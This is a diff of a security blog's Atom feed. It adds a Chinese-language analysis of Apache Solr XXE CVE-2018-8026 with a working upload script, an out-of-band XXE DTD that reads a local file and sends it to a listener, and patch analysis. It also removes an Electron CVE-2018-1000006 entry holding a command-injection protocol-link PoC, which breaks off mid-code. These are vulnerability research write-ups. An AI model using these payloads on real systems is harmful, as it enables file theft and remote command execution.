@@ -229,6 +229,70 @@
   </entry>
   
   <entry>
+    <title>Apache Solr XXE漏洞分析 -【CVE-2018-8026】</title>
+    <link href="http://chybeta.github.io/2018/07/16/Apache-Solr-XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-8026%E3%80%91/"/>
+    <id>http://chybeta.github.io/2018/07/16/Apache-Solr-XXE漏洞分析-【CVE-2018-8026】/</id>
+    <published>2018-07-16T15:13:26.000Z</published>
+    <updated>2018-07-16T15:18:40.278Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="external">Apache Solr XXE漏洞分析 -【CVE-2018-8026】</a><br><a id="more"></a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这次的XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper。</p>
+<h2 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h2><p>在 zookeeper文件夹下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ cp .\conf\zoo_sample.cfg .\conf\zoo.cfg、</div></pre></td></tr></table></figure></p>
+<p>修改 <code>conf\zoo.cfg</code>中的<code>dataDir</code>和<code>clientPort</code>，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">dataDir= D:\\vuln\\zookeeper-3.4.12\\data</div><div class="line"># the port at which the clients will connect</div><div class="line">clientPort=2181</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>然后启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ .\bin\zkServer.cmd</div></pre></td></tr></table></figure></p>
+<h2 id="solr"><a href="#solr" class="headerlink" title="solr"></a>solr</h2><p>solr受影响版本： 6.6.4, 7.3.1</p>
+<p>solr的具体搭建过程不详细说明。通过<code>ant idea</code>等一系列编译可以搭建idea环境。最后启动solr服务时如下，其中<code>-DzkHost=localhost</code>即上面配置zookeeper的<code>clientPort</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">solr start -p 8983 -f -a &quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988 -DzkHost=localhost:2181&quot;</div></pre></td></tr></table></figure></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>附上最简单的脚本evil.py，其中evil.zip见文章附件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">upload_url = <span class="string">"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=evilconfig"</span></div><div class="line">files = open(<span class="string">"evil.zip"</span>, <span class="string">"rb"</span>)</div><div class="line">print(requests.post(upload_url, data=files).text)</div><div class="line"></div><div class="line">create_url = <span class="string">"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=eviltest&amp;numShards=1&amp;collection.configName=evilconfig"</span></div><div class="line">print(requests.get(create_url).text)</div></pre></td></tr></table></figure></p>
+<p>还有外部实体xxe.dtd，如下用于读取存放在C盘根目录下的chybeta.txt文件：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM "file:///C:/chybeta.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1:8888?%file;/'&gt;"&gt;%int;%send;</div></pre></td></tr></table></figure></p>
+<p>如下图，<code>8000</code>服务器用于提供xxe.dtd，<code>8888</code>服务器用于接受xxe传送出来的结果</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0eca9ac-88db-1.gif" alt="4.gif"></p>
+<p>关于XXE的攻击方式等知识不妨参考<a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击</a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE 1"></a>XXE 1</h2><p>第一步是需要去上传ConfigSet，根据<a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html#ConfigSetsAPI-upload" target="_blank" rel="external">Upload a ConfigSet</a>，这一步是将几个xml文件打包成压缩包后上传，其中 schema.xml内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"currency"</span> <span class="attr">class</span>=<span class="string">"solr.CurrencyField"</span> <span class="attr">precisionStep</span>=<span class="string">"8"</span> <span class="attr">defaultCurrency</span>=<span class="string">"USD"</span> <span class="attr">currencyConfig</span>=<span class="string">"currency.xml"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>currency.xml为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
+<p>还有一个solrconfig.xml，其内容在此省略。</p>
+<p>考虑到是xxe，因此主要来看在何处发生了xml外部实体的解析。当开始第二个请求<code>solr/admin/collections?action=CREATE</code>时，solrcloud将根据指定的<code>collection.configName</code>即上一步上传的evilconfig来进行创建Collections。</p>
+<p>org/apache/solr/schema/FileExchangeRateProvider.java:245<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inform</span><span class="params">(ResourceLoader loader)</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  <span class="keyword">if</span>(loader == <span class="keyword">null</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.SERVER_ERROR, <span class="string">"Needs ResourceLoader in order to load config file"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">this</span>.loader = loader;</div><div class="line">  reload();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>跟进<code>reload</code>，到达<br>org/apache/solr/schema/FileExchangeRateProvider.java:159，此时变量如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0ff3c0c-88db-1.png" alt="1.jpg"></p>
+<p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  InputStream is = <span class="keyword">null</span>;</div><div class="line">  Map&lt;String, Map&lt;String, Double&gt;&gt; tmpRates = <span class="keyword">new</span> HashMap&lt;&gt;();</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    log.debug(<span class="string">"Reloading exchange rates from file "</span>+<span class="keyword">this</span>.currencyConfigFile);</div><div class="line"></div><div class="line">    is = loader.openResource(currencyConfigFile);</div><div class="line">    javax.xml.parsers.DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      dbf.setXIncludeAware(<span class="keyword">true</span>);</div><div class="line">      dbf.setNamespaceAware(<span class="keyword">true</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (UnsupportedOperationException e) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.BAD_REQUEST, <span class="string">"XML parser doesn't support XInclude option"</span>, e);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
+<p><code>currencyConfigFile</code>即前面的currency.xml，<br>通过<code>is = loader.openResource(currencyConfigFile);</code>读取了内容后，在最后把<code>is</code>对象传给了<code>dbf</code>。在<code>dbf.newDocumentBuilder().parse(is);</code>解析了外部实体，造成了xxe。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f1117a20-88db-1.png" alt="2.jpg"></p>
+<h2 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE 2"></a>XXE 2</h2><p>同样发生在对<code>schema.xml</code>的解析中，我们修改<code>schema.xml</code>的内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"priorityLevel"</span> <span class="attr">class</span>=<span class="string">"solr.EnumFieldType"</span> <span class="attr">docValues</span>=<span class="string">"true"</span> <span class="attr">enumsConfig</span>=<span class="string">"enumsConfig.xml"</span> <span class="attr">enumName</span>=<span class="string">"priority"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><code>enumsConfig.xml</code>内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
+<p>将<code>schema.xml</code>，<code>enumsConfig.xml</code>和<code>solrconfig.xml</code>打包成zip后，用上面的脚本执行。当solr运行至 org/apache/solr/schema/AbstractEnumField.java:90</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173806-f138933a-88db-1.png" alt="3.jpg"></p>
+<p>接着在 org/apache/solr/schema/AbstractEnumField.java:110<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">InputStream is = <span class="keyword">null</span>;</div><div class="line">  </div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    is = schema.getResourceLoader().openResource(enumsConfigFile);</div><div class="line">    <span class="keyword">final</span> DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">final</span> Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
+<p>同样由于<code>dbf.newDocumentBuilder().parse(is)</code>造成了外部实体的解析</p>
+<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>针对 XXE 1 和 XXE 2 的补丁为 <a href="https://issues.apache.org/jira/secure/attachment/12926593/SOLR-12450.patch" target="_blank" rel="external">SOLR-12450.patch</a></p>
+<p>其中增加了<code>solr/core/src/java/org/apache/solr/util/SafeXMLParsing.java</code>，其中定义了多种解析xml的方法。比如<code>parseConfigXML</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/** Parses a config file from ResourceLoader. Xinclude and external entities are enabled, but cannot escape the resource loader. */</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Document <span class="title">parseConfigXML</span><span class="params">(Logger log, ResourceLoader loader, String file)</span> <span class="keyword">throws</span> SAXException, IOException </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">final</span> DocumentBuilder db = dbf.newDocumentBuilder();</div><div class="line">    db.setEntityResolver(<span class="keyword">new</span> SystemIdResolver(loader));</div><div class="line">    db.setErrorHandler(<span class="keyword">new</span> XMLErrorLogger(log));</div><div class="line">    <span class="keyword">return</span> db.parse(in, SystemIdResolver.createSystemIdFromResourceName(file));</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>对应的<code>FileExchangeRateProvider.java</code>也换成了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, currencyConfigFile);</div></pre></td></tr></table></figure></p>
+<p><code>AbstractEnumField.java</code>则为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, enumsConfigFile);</div></pre></td></tr></table></figure></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="https://issues.apache.org/jira/browse/SOLR-12450" target="_blank" rel="external">SolrSOLR-12450</a></li>
+<li><a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html" target="_blank" rel="external">Sorl: ConfigSets API</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2448&quot;&gt;Apache Solr XXE漏洞分析 -【CVE-2018-8026】&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
+    
+      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
+    
+      <category term="solr" scheme="http://chybeta.github.io/tags/solr/"/>
+    
+  </entry>
+  
+  <entry>
     <title>RCE with Git submodule分析-【CVE-2018-11235】</title>
     <link href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-11235%E3%80%91/"/>
     <id>http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/</id>
@@ -377,9 +441,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -448,11 +512,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -653,11 +717,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -763,11 +827,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -970,9 +1034,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1373,9 +1437,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1619,71 +1683,6 @@
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[CVE-2018-1000006]Electron &lt;= v1.8.2-beta.4 远程命令执行漏洞</title>
-    <link href="http://chybeta.github.io/2018/01/24/CVE-2018-1000006-Electron-v1-8-2-beta-4-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://chybeta.github.io/2018/01/24/CVE-2018-1000006-Electron-v1-8-2-beta-4-远程命令执行漏洞/</id>
-    <published>2018-01-24T12:29:34.000Z</published>
-    <updated>2018-02-03T11:42:16.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>本文首发于<a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】</a></p>
-<a id="more"></a>
-<h1 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h1><p>Electron是基于Chromium 和Node.js，并使用HTML、JS、CSS来构建应用的框架。项目地址：<a href="https://github.com/electron/electron" target="_blank" rel="external">https://github.com/electron/electron</a> 。在1月22日，官方发布了对漏洞的通告<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/1.jpg?raw=true" alt=""></p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>从上述通告可知，该漏洞有两个要点：</p>
-<ol>
-<li>基于electron构建的app登记了协议，即可以使用该协议直接打开应用程序。</li>
-<li>影响win平台</li>
-</ol>
-<p>可以直接从<a href="https://github.com/CHYbeta/CVE-2018-1000006-DEMO" target="_blank" rel="external">CHYbeta/CVE-2018-1000006-DEMO</a>获取环境，以下部分即可忽略。</p>
-<p>新建一个文件夹比如test，里面新建三个文件main.js，index.html，package.json：</p>
-<p>main.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;app, BrowserWindow&#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</div><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</div><div class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</div><div class="line"><span class="keyword">const</span> dialog = <span class="built_in">require</span>(<span class="string">'electron'</span>).dialog</div><div class="line"><span class="keyword">let</span> win</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  win = <span class="keyword">new</span> BrowserWindow(&#123;<span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span>&#125;)</div><div class="line">  win.loadURL(url.format(&#123;</div><div class="line">    <span class="attr">pathname</span>: path.join(__dirname, <span class="string">'index.html'</span>),</div><div class="line">    <span class="attr">protocol</span>: <span class="string">'file:'</span>,</div><div class="line">    <span class="attr">slashes</span>: <span class="literal">true</span></div><div class="line">  &#125;))</div><div class="line">  win.on(<span class="string">'closed'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    win = <span class="literal">null</span></div><div class="line">  &#125;)</div><div class="line">&#125;</div><div class="line">app.on(<span class="string">'ready'</span>, createWindow)</div><div class="line">app.on(<span class="string">'window-all-closed'</span>, () =&gt; &#123;</div><div class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</div><div class="line">    app.quit()</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line">app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (win === <span class="literal">null</span>) &#123;</div><div class="line">    createWindow()</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line">app.setAsDefaultProtocolClient(<span class="string">'chybeta'</span>)</div></pre></td></tr></table></figure></p>
-<p>index.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">    This is a demo for CVE-2018-1000006<span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">    Electron version:<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(process.versions[<span class="string">'electron'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>.</div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>package.json:<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"name"</span>    : <span class="string">"CVE-2018-1000006 Demo"</span>,</div><div class="line">  <span class="attr">"version"</span> : <span class="string">"0.0.1"</span>,</div><div class="line">  <span class="attr">"main"</span>    : <span class="string">"main.js"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>包成exe应用,生成有漏洞的版本应用，这里我选择electron版本为1.7.8<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">electron-packager ./test elec_rce --win --out ./elec_rce --arch=x64 --version=0.0.1 --electron-version=1.7.8 --download.mirror=https://npm.taobao.org/mirrors/electron/</div></pre></td></tr></table></figure></p>
-<h1 id="复现与分析"><a href="#复现与分析" class="headerlink" title="复现与分析"></a>复现与分析</h1><p>本地写一个html，其中协议的名称要与之前的设置对上，poc.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	POC for CVE-2018-1000006</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"protocol"</span> <span class="attr">href</span>=<span class="string">'chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc'</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>payload: chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>当点击一个链接时，会触发cmd，并弹出计算器:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/3.jpg?raw=true" alt=""></p>
-<p>在electron的源码中，<a href="https://github.com/electron/electron/blob/b9c0bab8f1e8c40427db3d48da3d51481f6603c2/atom/browser/browser_win.cc#L212" target="_blank" rel="external">atom\browser\browser_win.cc的第212行</a>定义了SetAsDefaultProtocolClient方法：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div 